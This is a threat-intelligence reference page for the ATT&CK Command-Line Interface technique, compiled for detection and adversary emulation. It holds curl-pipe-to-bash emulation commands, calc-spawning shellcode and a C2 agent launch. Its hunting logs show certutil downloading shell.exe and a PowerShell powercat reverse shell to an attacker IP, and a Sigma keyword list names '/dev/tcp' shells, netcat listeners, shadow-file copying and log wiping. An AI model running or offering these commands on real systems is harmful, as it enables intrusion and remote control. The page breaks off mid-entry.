
# Command-Line Interface

## Description

### MITRE Description

> Command-line interfaces provide a way of interacting with computer systems and is a common feature across many types of operating system platforms. (Citation: Wikipedia Command-Line Interface) One example command-line interface on Windows systems is [cmd](https://attack.mitre.org/software/S0106), which can be used to perform a number of tasks including execution of other software. Command-line interfaces can be interacted with locally or remotely via a remote desktop application, reverse shell session, etc. Commands that are executed run with the current permission level of the command-line interface process unless the command includes process invocation that changes permissions context for that execution (e.g. [Scheduled Task](https://attack.mitre.org/techniques/T1053)).

Adversaries may use command-line interfaces to interact with systems and execute other software during the course of an operation.

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User', 'Administrator', 'SYSTEM']
* Platforms: ['Linux', 'macOS', 'Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1059

## Potential Commands

```
curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash
wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash

{'windows': {'pwsh': {'command': 'Get-Process -Name "powershell" | Stop-Process\n'}}}
{'darwin': {'sh': {'command': './wifi.sh off\n', 'cleanup': './wifi.sh on\n', 'payloads': ['wifi.sh']}}, 'linux': {'sh': {'command': './wifi.sh off\n', 'cleanup': './wifi.sh on\n', 'payloads': ['wifi.sh']}}, 'windows': {'psh': {'command': '.\\wifi.ps1 -Off\n', 'cleanup': '.\\wifi.ps1 -On\n', 'payloads': ['wifi.ps1']}}}
{'darwin': {'sh': {'cleanup': 'rm #{payload}\n'}}, 'linux': {'sh': {'cleanup': 'rm #{payload}\n'}}, 'windows': {'psh,pwsh': {'cleanup': 'Remove-Item -Force -Path "#{payload}"'}}}
{'windows': {'shellcode_amd64': {'command': '0x50, 0x51, 0x52, 0x53, 0x56, 0x57, 0x55, 0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x83, 0xEC, 0x28, 0x65, 0x48, 0x8B, 0x32, 0x48, 0x8B, 0x76, 0x18, 0x48, 0x8B, 0x76, 0x10, 0x48, 0xAD, 0x48, 0x8B, 0x30, 0x48, 0x8B, 0x7E, 0x30, 0x03, 0x57, 0x3C, 0x8B, 0x5C, 0x17, 0x28, 0x8B, 0x74, 0x1F, 0x20, 0x48, 0x01, 0xFE, 0x8B, 0x54, 0x1F, 0x24, 0x0F, 0xB7, 0x2C, 0x17, 0x8D, 0x52, 0x02, 0xAD, 0x81, 0x3C, 0x07, 0x57, 0x69, 0x6E, 0x45, 0x75, 0xEF, 0x8B, 0x74, 0x1F, 0x1C, 0x48, 0x01, 0xFE, 0x8B, 0x34, 0xAE, 0x48, 0x01, 0xF7, 0x99, 0xFF, 0xD7, 0x48, 0x83, 0xC4, 0x30, 0x5D, 0x5F, 0x5E, 0x5B, 0x5A, 0x59, 0x58, 0xC3'}}}
{'darwin': {'sh': {'command': 'nohup ./sandcat.go -server #{server} &\n', 'cleanup': 'pkill -f sandcat\n', 'payloads': ['sandcat.go']}}, 'linux': {'sh': {'command': 'nohup ./sandcat.go -server #{server} &\n', 'cleanup': 'pkill -f sandcat\n', 'payloads': ['sandcat.go']}}}
\\Windows\\.+\\cmd.exe
cmd.exe|/c
powershell/lateral_movement/invoke_sqloscmd
powershell/lateral_movement/invoke_sqloscmd
powershell/management/spawnas
powershell/management/spawnas
Log
#sysmon log
EventID: 1
Image: C: \ Windows \ System32 \ certutil.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: CertUtil.exe
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: CertUtil.exe
CommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe

# Win7 security log
EventID: 4688
Process information:
New Process ID: 0xbcc
New Process Name: C: \ Windows \ System32 \ certutil.exe

#windows server 2008 (excluding 2008) or more systems can be configured to create a policy review process, achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters.
Log
EventID: 4688 # security logs, windows server 2012 above configuration audit policy, command parameters can be recorded
Process information:
New Process ID: 0x474
New Process Name: C: \ Windows \ System32 \ cmd.exe

EventID: 4688
Process information:
New Process ID: 0x3f8
New Process Name: C: \ Users \ 12306Br0 \ Desktop \ a \ payload.exe

EventID: 5156
Application Information:
Process ID: 1016
Application Name: \ device \ harddiskvolume2 \ users \ 12306br0 \ desktop \ a \ payload.exe

Internet Information:
Direction: Outbound
Source address: 192.168.126.149
Source Port: 49221
Destination address: 192.168.126.146
Destination Port: 53
Protocol: 6

EventID: 1 #sysmon log
Image: C: \ Windows \ System32 \ cmd.exe
FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)
Description: Windows Command Processor
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: C: \ Windows \ system32 \ cmd.exe / C C: \ Users \ 12306Br0 \ Desktop \ a \ payload.exe
CurrentDirectory: C: \ Windows \ system32 \
User: 12306Br0-PC \ 12306Br0
LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}
LogonId: 0x550ac
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1 = 0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8
ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}
ParentProcessId: 1112
ParentImage: C: \ Windows \ System32 \ ftp.exe
ParentCommandLine: ftp
Log
#sysmon log
EventID: 1
Image: C: \ Windows \ System32 \ WindowsPowerShell \ v1.0 \ powershell.exe
FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)
Description: Windows PowerShell
Product: Microsoft Windows Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell -c "IEX (New-Object System.Net.WebClient) .DownloadString ( 'http://192.168.126.146/powercat.ps1'); powercat -c 192.168.126.146 -p 1234 -e cmd"

# Win7 security log
EventID: 4688
Process information:
New Process ID: 0x330
New Process Name: C: \ Windows \ System32 \ cmd.exe
Token Type lift: TokenElevationTypeLimited (3)

EventID: 4688
Process information:
New Process ID: 0xa44
New Process Name: C: \ Windows \ System32 \ WindowsPowerShell \ v1.0 \ powershell.exe

#Powershell V5 (V5 containing more than) configuration audit policy, you can achieve the effect of recording the command-line parameters. Monitoring and analysis conducted by command line parameters. Of course, it can also be used to configure windows server 2008 (excluding 2008) over the audit process to create a policy, you can also record on the command line parameters, and finally to monitoring results.
```

## Commands Dataset

```
[{'command': 'curl -sS '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh '
             '| bash\n'
             'wget --quiet -O - '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh '
             '| bash\n',
  'name': None,
  'source': 'atomics/T1059/T1059.yaml'},
 {'command': {'windows': {'pwsh': {'command': 'Get-Process -Name "powershell" '
                                              '| Stop-Process\n'}}},
  'name': 'Kill all PowerShell processes',
  'source': 'data/abilities/execution/134b49a3-3f93-41bd-85f4-563eadbb6055.yml'},
 {'command': {'darwin': {'sh': {'cleanup': './wifi.sh on\n',
                                'command': './wifi.sh off\n',
                                'payloads': ['wifi.sh']}},
              'linux': {'sh': {'cleanup': './wifi.sh on\n',
                               'command': './wifi.sh off\n',
                               'payloads': ['wifi.sh']}},
              'windows': {'psh': {'cleanup': '.\\wifi.ps1 -On\n',
                                  'command': '.\\wifi.ps1 -Off\n',
                                  'payloads': ['wifi.ps1']}}},
  'name': 'Turn a computers WIFI off',
  'source': 'data/abilities/execution/2fe2d5e6-7b06-4fc0-bf71-6966a1226731.yml'},
 {'command': {'darwin': {'sh': {'cleanup': 'rm #{payload}\n'}},
              'linux': {'sh': {'cleanup': 'rm #{payload}\n'}},
              'windows': {'psh,pwsh': {'cleanup': 'Remove-Item -Force -Path '
                                                  '"#{payload}"'}}},
  'name': 'Remove a downloaded payload file',
  'source': 'data/abilities/execution/4cd4eb44-29a7-4259-91ae-e457b283a880.yml'},
 {'command': {'windows': {'shellcode_amd64': {'command': '0x50, 0x51, 0x52, '
                                                         '0x53, 0x56, 0x57, '
                                                         '0x55, 0x6A, 0x60, '
                                                         '0x5A, 0x68, 0x63, '
                                                         '0x61, 0x6C, 0x63, '
                                                         '0x54, 0x59, 0x48, '
                                                         '0x83, 0xEC, 0x28, '
                                                         '0x65, 0x48, 0x8B, '
                                                         '0x32, 0x48, 0x8B, '
                                                         '0x76, 0x18, 0x48, '
                                                         '0x8B, 0x76, 0x10, '
                                                         '0x48, 0xAD, 0x48, '
                                                         '0x8B, 0x30, 0x48, '
                                                         '0x8B, 0x7E, 0x30, '
                                                         '0x03, 0x57, 0x3C, '
                                                         '0x8B, 0x5C, 0x17, '
                                                         '0x28, 0x8B, 0x74, '
                                                         '0x1F, 0x20, 0x48, '
                                                         '0x01, 0xFE, 0x8B, '
                                                         '0x54, 0x1F, 0x24, '
                                                         '0x0F, 0xB7, 0x2C, '
                                                         '0x17, 0x8D, 0x52, '
                                                         '0x02, 0xAD, 0x81, '
                                                         '0x3C, 0x07, 0x57, '
                                                         '0x69, 0x6E, 0x45, '
                                                         '0x75, 0xEF, 0x8B, '
                                                         '0x74, 0x1F, 0x1C, '
                                                         '0x48, 0x01, 0xFE, '
                                                         '0x8B, 0x34, 0xAE, '
                                                         '0x48, 0x01, 0xF7, '
                                                         '0x99, 0xFF, 0xD7, '
                                                         '0x48, 0x83, 0xC4, '
                                                         '0x30, 0x5D, 0x5F, '
                                                         '0x5E, 0x5B, 0x5A, '
                                                         '0x59, 0x58, 0xC3'}}},
  'name': 'Start a new calculator process',
  'source': 'data/abilities/execution/a42dfc86-12f0-4f06-b0cf-24830c7f61f4.yml'},
 {'command': {'darwin': {'sh': {'cleanup': 'pkill -f sandcat\n',
                                'command': 'nohup ./sandcat.go -server '
                                           '#{server} &\n',
                                'payloads': ['sandcat.go']}},
              'linux': {'sh': {'cleanup': 'pkill -f sandcat\n',
                               'command': 'nohup ./sandcat.go -server '
                                          '#{server} &\n',
                               'payloads': ['sandcat.go']}}},
  'name': 'Start a new 54ndc47 agent in background',
  'source': 'data/abilities/execution/b1d41972-3ad9-4aa1-8f7f-05f049a2980e.yml'},
 {'command': '\\\\Windows\\\\.+\\\\cmd.exe',
  'name': None,
  'source': 'SysmonHunter - Command-Line Interface'},
 {'command': 'cmd.exe|/c',
  'name': None,
  'source': 'SysmonHunter - Command-Line Interface'},
 {'command': 'powershell/lateral_movement/invoke_sqloscmd',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_sqloscmd',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/spawnas',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/management/spawnas',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'Log\n'
             '#sysmon log\n'
             'EventID: 1\n'
             'Image: C: \\ Windows \\ System32 \\ certutil.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: CertUtil.exe\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: CertUtil.exe\n'
             'CommandLine: certutil.exe -urlcache -split -f '
             'http://192.168.126.146:1234/shell.exe shell.exe\n'
             '\n'
             '# Win7 security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xbcc\n'
             'New Process Name: C: \\ Windows \\ System32 \\ certutil.exe\n'
             '\n'
             '#windows server 2008 (excluding 2008) or more systems can be '
             'configured to create a policy review process, achieve the effect '
             'of recording the command-line parameters. Monitoring and '
             'analysis conducted by command line parameters.',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Log\n'
             'EventID: 4688 # security logs, windows server 2012 above '
             'configuration audit policy, command parameters can be recorded\n'
             'Process information:\n'
             'New Process ID: 0x474\n'
             'New Process Name: C: \\ Windows \\ System32 \\ cmd.exe\n'
             '\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x3f8\n'
             'New Process Name: C: \\ Users \\ 12306Br0 \\ Desktop \\ a \\ '
             'payload.exe\n'
             '\n'
             'EventID: 5156\n'
             'Application Information:\n'
             'Process ID: 1016\n'
             'Application Name: \\ device \\ harddiskvolume2 \\ users \\ '
             '12306br0 \\ desktop \\ a \\ payload.exe\n'
             '\n'
             'Internet Information:\n'
             'Direction: Outbound\n'
             'Source address: 192.168.126.149\n'
             'Source Port: 49221\n'
             'Destination address: 192.168.126.146\n'
             'Destination Port: 53\n'
             'Protocol: 6\n'
             '\n'
             'EventID: 1 #sysmon log\n'
             'Image: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'FileVersion: 6.1.7601.17514 (win7sp1_rtm.101119-1850)\n'
             'Description: Windows Command Processor\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: Cmd.Exe\n'
             'CommandLine: C: \\ Windows \\ system32 \\ cmd.exe / C C: \\ '
             'Users \\ 12306Br0 \\ Desktop \\ a \\ payload.exe\n'
             'CurrentDirectory: C: \\ Windows \\ system32 \\\n'
             'User: 12306Br0-PC \\ 12306Br0\n'
             'LogonGuid: {bb1f7c32-e7a1-5e9a-0000-0020ac500500}\n'
             'LogonId: 0x550ac\n'
             'TerminalSessionId: 1\n'
             'IntegrityLevel: High\n'
             'Hashes: SHA1 = 0F3C4FF28F354AEDE202D54E9D1C5529A3BF87D8\n'
             'ParentProcessGuid: {bb1f7c32-ed99-5e9a-0000-00105addaf00}\n'
             'ParentProcessId: 1112\n'
             'ParentImage: C: \\ Windows \\ System32 \\ ftp.exe\n'
             'ParentCommandLine: ftp',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'},
 {'command': 'Log\n'
             '#sysmon log\n'
             'EventID: 1\n'
             'Image: C: \\ Windows \\ System32 \\ WindowsPowerShell \\ v1.0 \\ '
             'powershell.exe\n'
             'FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255)\n'
             'Description: Windows PowerShell\n'
             'Product: Microsoft Windows Operating System\n'
             'Company: Microsoft Corporation\n'
             'OriginalFileName: PowerShell.EXE\n'
             'CommandLine: powershell -c "IEX (New-Object '
             'System.Net.WebClient) .DownloadString ( '
             "'http://192.168.126.146/powercat.ps1'); powercat -c "
             '192.168.126.146 -p 1234 -e cmd"\n'
             '\n'
             '# Win7 security log\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0x330\n'
             'New Process Name: C: \\ Windows \\ System32 \\ cmd.exe\n'
             'Token Type lift: TokenElevationTypeLimited (3)\n'
             '\n'
             'EventID: 4688\n'
             'Process information:\n'
             'New Process ID: 0xa44\n'
             'New Process Name: C: \\ Windows \\ System32 \\ WindowsPowerShell '
             '\\ v1.0 \\ powershell.exe\n'
             '\n'
             '#Powershell V5 (V5 containing more than) configuration audit '
             'policy, you can achieve the effect of recording the command-line '
             'parameters. Monitoring and analysis conducted by command line '
             'parameters. Of course, it can also be used to configure windows '
             'server 2008 (excluding 2008) over the audit process to create a '
             'policy, you can also record on the command line parameters, and '
             'finally to monitoring results.',
  'name': 'Log',
  'source': 'https://raw.githubusercontent.com/12306Bro/Threathunting-book/master/{}'}]
```

## Potential Detections

```json
[{'data_source': {'author': 'Florian Roth',
                  'description': 'Detects suspicious shell commands used in '
                                 'various Equation Group scripts and tools',
                  'detection': {'condition': 'keywords',
                                'keywords': ['chown root*chmod 4777 ',
                                             'cp /bin/sh .;chown',
                                             'chmod 4777 '
                                             '/tmp/.scsi/dev/bin/gsh',
                                             'chown root:root '
                                             '/tmp/.scsi/dev/bin/',
                                             'chown root:root x;',
                                             '/bin/telnet locip locport < '
                                             '/dev/console | /bin/sh',
                                             '/tmp/ratload',
                                             'ewok -t ',
                                             'xspy -display ',
                                             'cat > /dev/tcp/127.0.0.1/80 '
                                             '<<END',
                                             'rm -f '
                                             '/current/tmp/ftshell.latest',
                                             'ghost_* -v ',
                                             ' --wipe > /dev/null',
                                             'ping -c 2 *; grep * '
                                             '/proc/net/arp >/tmp/gx',
                                             'iptables * OUTPUT -p tcp -d '
                                             '127.0.0.1 --tcp-flags RST RST -j '
                                             'DROP;',
                                             '> /var/log/audit/audit.log; rm '
                                             '-f .',
                                             'cp /var/log/audit/audit.log .tmp',
                                             'sh >/dev/tcp/* <&1 2>&1',
                                             'ncat -vv -l -p * <',
                                             'nc -vv -l -p * <',
                                             '< /dev/console | uudecode && '
                                             'uncompress',
                                             'sendmail -osendmail;chmod +x '
                                             'sendmail',
                                             '/usr/bin/wget -O /tmp/a http* && '
                                             'chmod 755 /tmp/cron',
                                             'chmod 666 /var/run/utmp~',
                                             'chmod 700 nscd crond',
                                             'cp /etc/shadow /tmp/.',
                                             '</dev/console |uudecode > '
                                             '/dev/null 2>&1 && uncompress',
                                             'chmod 700 jp&&netstat -an|grep',
                                             'uudecode > /dev/null 2>&1 && '
                                             'uncompress -f * && chmod 755',
                                             'chmod 700 crond',
                                             'wget http*; chmod +x '
                                             '/tmp/sendmail',
                                             'chmod 700 fp sendmail pt',
                                             'chmod 755 /usr/vmsys/bin/pipe',
                                             'chmod -R 755 /usr/vmsys',
                                             'chmod 755 $opbin/*tunnel',
                                             'chmod 700 sendmail',
                                             'chmod 0700 sendmail',
                                             '/usr/bin/wget '
                                             'http*sendmail;chmod +x sendmail;',
                                             '&& telnet * 2>&1 </dev/console']},
                  'falsepositives': ['Unknown'],
                  'id': '41e5c73d-9983-4b69-bd03-e13b67e9623c',
                  'level': 'high',
                  'logsource': {'product': 'linux'},
                  'references': ['https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1'],
                  'tags': ['attack.execution', 'attack.g0020', 'attack.t1059'],
                  'title': 'Equation Group Indicators'}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2017/05/31',
                  'description': 'This events that are generated when using '
                                 'the hacktool Ruler by Sensepost',
                  'detection': {'condition': '(1 of selection*)',
                                'selection1': {'EventID': [4776],
                                               'Workstation': 'RULER'},
                                'selection2': {'EventID': [4624, 4625],
                                               'WorkstationName': 'RULER'}},
                  'falsepositives': ['Go utilities that use staaldraad awesome '
                                     'NTLM library'],
                  'id': '24549159-ac1b-479c-8175-d42aea947cae',
                  'level': 'high',
                  'logsource': {'product': 'windows', 'service': 'security'},
                  'modified': '2019/07/26',
                  'references': ['https://github.com/sensepost/ruler',
                                 'https://github.com/sensepost/ruler/issues/47',
                                 'https://github.com/staaldraad/go-ntlm/blob/master/ntlm/ntlmv1.go#L427',
                                 'https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776',
                                 'https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624'],
                  'tags': ['attack.discovery',
                           'attack.execution',
                           'attack.t1087',
                           'attack.t1075',
                           'attack.t1114',
                           'attack.t1059'],
                  'title': 'Hacktool Ruler'}},
 {'data_source': {'author': 'Florian Roth',
                  'description': 'Detects a suspicious command line execution '
                                 'that includes an URL and AppData string in '
                                 'the command line parameters as used by '
                                 'several droppers (js/vbs > powershell)',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['cmd.exe /c '
                                                              '*http://*%AppData%',
                                                              'cmd.exe /c '
                                                              '*https://*%AppData%']}},
                  'falsepositives': ['High'],
                  'fields': ['CommandLine', 'ParentCommandLine'],
                  'id': '1ac8666b-046f-4201-8aba-1951aaec03a3',
                  'level': 'medium',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100',
                                 'https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100'],
                  'status': 'experimental',
                  'tags': ['attack.execution', 'attack.t1059'],
                  'title': 'Command Line Execution with suspicious URL and '
                           'AppData Strings'}},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4688', 'Process Execution']}]
```

## Potential Queries

```json
[{'name': 'Command Line Interface',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_path contains "cmd.exe"'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Command-Line Interface': {'atomic_tests': [{'auto_generated_guid': 'd0c88567-803d-4dca-99b4-7ce65e7b257c',
                                                                      'description': 'Using '
                                                                                     'Curl '
                                                                                     'to '
                                                                                     'download '
                                                                                     'and '
                                                                                     'pipe '
                                                                                     'a '
                                                                                     'payload '
                                                                                     'to '
                                                                                     'Bash. '
                                                                                     'NOTE: '
                                                                                     'Curl-ing '
                                                                                     'to '
                                                                                     'Bash '
                                                                                     'is '
                                                                                     'generally '
                                                                                     'a '
                                                                                     'bad '
                                                                                     'idea '
                                                                                     'if '
                                                                                     'you '
                                                                                     "don't "
                                                                                     'control '
                                                                                     'the '
                                                                                     'server.\n'
                                                                                     '\n'
                                                                                     'Upon '
                                                                                     'successful '
                                                                                     'execution, '
                                                                                     'sh '
                                                                                     'will '
                                                                                     'download '
                                                                                     'via '
                                                                                     'curl '
                                                                                     'and '
                                                                                     'wget '
                                                                                     'the '
                                                                                     'specified '
                                                                                     'payload '
                                                                                     '(echo-art-fish.sh) '
                                                                                     'and '
                                                                                     'set '
                                                                                     'a '
                                                                                     'marker '
                                                                                     'file '
                                                                                     'in '
                                                                                     '`/tmp/art-fish.txt`.\n',
                                                                      'executor': {'cleanup_command': 'rm '
                                                                                                      '/tmp/art-fish.txt\n',
                                                                                   'command': 'curl '
                                                                                              '-sS '
                                                                                              'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh '
                                                                                              '| '
                                                                                              'bash\n'
                                                                                              'wget '
                                                                                              '--quiet '
                                                                                              '-O '
                                                                                              '- '
                                                                                              'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh '
                                                                                              '| '
                                                                                              'bash\n',
                                                                                   'name': 'sh'},
                                                                      'name': 'Command-Line '
                                                                              'Interface',
                                                                      'supported_platforms': ['macos',
                                                                                              'linux']}],
                                                    'attack_technique': 'T1059',
                                                    'display_name': 'Command-Line '
                                                                    'Interface'}},
 {'Mitre Stockpile - Kill all PowerShell processes': {'description': 'Kill all '
                                                                     'PowerShell '
                                                                     'processes',
                                                      'id': '134b49a3-3f93-41bd-85f4-563eadbb6055',
                                                      'name': 'Stop PowerShell '
                                                              'processes',
                                                      'platforms': {'windows': {'pwsh': {'command': 'Get-Process '
                                                                                                    '-Name '
                                                                                                    '"powershell" '
                                                                                                    '| '
                                                                                                    'Stop-Process\n'}}},
                                                      'tactic': 'execution',
                                                      'technique': {'attack_id': 'T1059',
                                                                    'name': 'Command-Line '
                                                                            'Interface'}}},
 {'Mitre Stockpile - Turn a computers WIFI off': {'description': 'Turn a '
                                                                 'computers '
                                                                 'WIFI off',
                                                  'id': '2fe2d5e6-7b06-4fc0-bf71-6966a1226731',
                                                  'name': 'Disrupt WIFI',
                                                  'platforms': {'darwin': {'sh': {'cleanup': './wifi.sh '
                                                                                             'on\n',
                                                                                  'command': './wifi.sh '
                                                                                             'off\n',
                                                                                  'payloads': ['wifi.sh']}},
                                                                'linux': {'sh': {'cleanup': './wifi.sh '
                                                                                            'on\n',
                                                                                 'command': './wifi.sh '
                                                                                            'off\n',
                                                                                 'payloads': ['wifi.sh']}},
                                                                'windows': {'psh': {'cleanup': '.\\wifi.ps1 '
                                                                                               '-On\n',
                                                                                    'command': '.\\wifi.ps1 '
                                                                                               '-Off\n',
                                                                                    'payloads': ['wifi.ps1']}}},
                                                  'tactic': 'execution',
                                                  'technique': {'attack_id': 'T1059',
                                                                'name': 'Command-Line '
                                                                        'Interface'}}},
 {'Mitre Stockpile - Remove a downloaded payload file': {'description': 'Remove '
                                                                        'a '
                                                                        'downloaded '
                                                                        'payload '
                                                                        'file',
                                                         'id': '4cd4eb44-29a7-4259-91ae-e457b283a880',
                                                         'name': 'Delete '
                                                                 'payload',
                                                         'platforms': {'darwin': {'sh': {'cleanup': 'rm '
                                                                                                    '#{payload}\n'}},
                                                                       'linux': {'sh': {'cleanup': 'rm '
                                                                                                   '#{payload}\n'}},
                                                                       'windows': {'psh,pwsh': {'cleanup': 'Remove-Item '
                                                                                                           '-Force '
                                                                                                           '-Path '
                                                                                                           '"#{payload}"'}}},
                                                         'tactic': 'execution',
                                                         'technique': {'attack_id': 'T1059',
                                                                       'name': 'Command-Line '
                                                                               'Interface'}}},
 {'Mitre Stockpile - Start a new calculator process': {'description': 'Start a '
                                                                      'new '
                                                                      'calculator '
                                                                      'process',
                                                       'id': 'a42dfc86-12f0-4f06-b0cf-24830c7f61f4',
                                                       'name': 'Spawn '
                                                               'calculator '
                                                               '(shellcode)',
                                                       'platforms': {'windows': {'shellcode_amd64': {'command': '0x50, '
                                                                                                                '0x51, '
                                                                                                                '0x52, '
                                                                                                                '0x53, '
                                                                                                                '0x56, '
                                                                                                                '0x57, '
                                                                                                                '0x55, '
                                                                                                                '0x6A, '
                                                                                                                '0x60, '
                                                                                                                '0x5A, '
                                                                                                                '0x68, '
                                                                                                                '0x63, '
                                                                                                                '0x61, '
                                                                                                                '0x6C, '
                                                                                                                '0x63, '
                                                                                                                '0x54, '
                                                                                                                '0x59, '
                                                                                                                '0x48, '
                                                                                                                '0x83, '
                                                                                                                '0xEC, '
                                                                                                                '0x28, '
                                                                                                                '0x65, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x32, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x76, '
                                                                                                                '0x18, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x76, '
                                                                                                                '0x10, '
                                                                                                                '0x48, '
                                                                                                                '0xAD, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x30, '
                                                                                                                '0x48, '
                                                                                                                '0x8B, '
                                                                                                                '0x7E, '
                                                                                                                '0x30, '
                                                                                                                '0x03, '
                                                                                                                '0x57, '
                                                                                                                '0x3C, '
                                                                                                                '0x8B, '
                                                                                                                '0x5C, '
                                                                                                                '0x17, '
                                                                                                                '0x28, '
                                                                                                                '0x8B, '
                                                                                                                '0x74, '
                                                                                                                '0x1F, '
                                                                                                                '0x20, '
                                                                                                                '0x48, '
                                                                                                                '0x01, '
                                                                                                                '0xFE, '
                                                                                                                '0x8B, '
                                                                                                                '0x54, '
                                                                                                                '0x1F, '
                                                                                                                '0x24, '
                                                                                                                '0x0F, '
                                                                                                                '0xB7, '
                                                                                                                '0x2C, '
                                                                                                                '0x17, '
                                                                                                                '0x8D, '
                                                                                                                '0x52, '
                                                                                                                '0x02, '
                                                                                                                '0xAD, '
                                                                                                                '0x81, '
                                                                                                                '0x3C, '
                                                                                                                '0x07, '
                                                                                                                '0x57, '
                                                                                                                '0x69, '
                                                                                                                '0x6E, '
                                                                                                                '0x45, '
                                                                                                                '0x75, '
                                                                                                                '0xEF, '
                                                                                                                '0x8B, '
                                                                                                                '0x74, '
                                                                                                                '0x1F, '
                                                                                                                '0x1C, '
                                                                                                                '0x48, '
                                                                                                                '0x01, '
                                                                                                                '0xFE, '
                                                                                                                '0x8B, '
                                                                                                                '0x34, '
                                                                                                                '0xAE, '
                                                                                                                '0x48, '
                                                                                                                '0x01, '
                                                                                                                '0xF7, '
                                                                                                                '0x99, '
                                                                                                                '0xFF, '
                                                                                                                '0xD7, '
                                                                                                                '0x48, '
                                                                                                                '0x83, '
                                                                                                                '0xC4, '
                                                                                                                '0x30, '
                                                                                                                '0x5D, '
                                                                                                                '0x5F, '
                                                                                                                '0x5E, '
                                                                                                                '0x5B, '
                                                                                                                '0x5A, '
                                                                                                                '0x59, '
                                                                                                                '0x58, '
                                                                                                                '0xC3'}}},
                                                       'tactic': 'execution',
                                                       'technique': {'attack_id': 'T1059',
                                                                     'name': 'Command-Line '
                                                                             'Interface'}}},
 {'Mitre Stockpile - Start a new 54ndc47 agent in background': {'description': 'Start '
                                                                               'a '
                                                                               'new '
                                                                               '54ndc47 '
                                                                               'agent '
                                                                               'in '
                                                                               'background',
                                                                'id': 'b1d41972-3ad9-4aa1-8f7f-05f049a2980e',
                                                                'name': 'Start '
                                                                        '54ndc47',
                                                                'platforms': {'darwin': {'sh': {'cleanup': 'pkill '
                                                                                                           '-f '
                                                                                                           'sandcat\n',
                                                                                                'command': 'nohup '
                                                                                                           './sandcat.go '
                                                                                                           '-server '
                                                                                                           '#{server} '
                                                                                                           '&\n',
                                                                                                'payloads': ['sandcat.go']}},
                                                                              'linux': {'sh': {'cleanup': 'pkill '
                                                                                                          '-f '
                                                                                                          'sandcat\n',
                                                                                               'command': 'nohup '
                                                                                                          './sandcat.go '
                                                                                                          '-server '
                                                                                                          '#{server} '
                                                                                                          '&\n',
                                                                                               'payloads': ['sandcat.go']}}},
                                                                'tactic': 'execution',
                                                                'technique': {'attack_id': 'T1059',
                                                                              'name': 'Command-Line '
                                                                                      'Interface'}}},
 {'SysmonHunter - T1059': {'description': None,
                           'level': 'medium',
